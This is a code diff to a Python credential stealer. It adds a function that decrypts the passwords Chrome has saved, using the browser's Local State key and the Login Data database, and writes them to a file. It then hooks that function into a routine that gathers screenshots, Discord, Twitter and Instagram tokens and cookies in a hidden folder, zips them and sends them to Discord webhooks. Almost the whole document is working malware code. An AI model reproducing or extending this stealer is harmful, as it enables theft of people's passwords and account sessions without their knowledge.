@@ -119,6 +119,63 @@ def decrypt_data(data, key):
         except:
             return ""
 
+def psw_chrome(path):
+  
+    def pass_encryption_key():
+        local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                        "AppData", "Local", "Google", "Chrome",
+                                        "User Data", "Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+            local_state = loads(local_state)
+        key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = key[5:]
+        return CryptUnprotectData(key, None, None, None, 0)[1]
+
+    def decrypt_password(password, key):
+        try:
+            iv = password[3:15]
+            password = password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(password)[:-16].decode()
+        except:
+            try:
+                return str(CryptUnprotectData(password, None, None, None, 0)[1])
+            except:
+                return ""
+
+    log = ""
+    count = 0
+    key = pass_encryption_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "default", "Login Data")
+    copyfile(db_path, "ChromeData.db")
+    db = connect("ChromeData.db")
+    cursor = db.cursor()
+    cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
+    for row in cursor.fetchall():
+        count = count+1
+        origin_url = row[0]
+        username = row[1]
+        password = decrypt_password(row[2], key)
+        if username or password:
+            log = ((f"{log}\n=~=~=~=\n[{count}]\nOrigin URL: {origin_url}\nUsername or mail: {username}\nPassword: {password}")) 
+        else:
+            continue
+    cursor.close()
+    db.close()
+    try:
+        os.remove("ChromeData.db")
+    except:
+        pass
+    if log == "":       
+        with open(f"{path}\\Chrome_pass.txt", "a", encoding="utf-8") as f:
+            f.write((f"\n\n\nCHROME PASSWORDS:\n\nAny chrome password founded !")) 
+    else:
+        with open(f"{path}\Chrome_pass.txt", "a", encoding="utf-8") as f:
+            f.write((f"\n\n\nCHROME PASSWORDS:\n{log}")) 
+    
 def main(dirpath):
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
@@ -210,6 +267,8 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     with TemporaryDirectory(dir='.') as td:
         SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
         get_screenshot(path=td)
+        psw_chrome(path=td)
+
         main_info = main(td)
         discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
         discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
@@ -252,6 +311,8 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 f.write(find_His())
                 zip.write(f.name)
             with open(get_screenshot.scrn_path, "rb") as f:
+                zip.write(f.name)
+            with open(os.path.join(td, 'Chrome_pass.txt'), 'w') as f:
                 zip.write(f.name)
             for name_f, _ in files_names:
                 if os.path.exists(name_f):
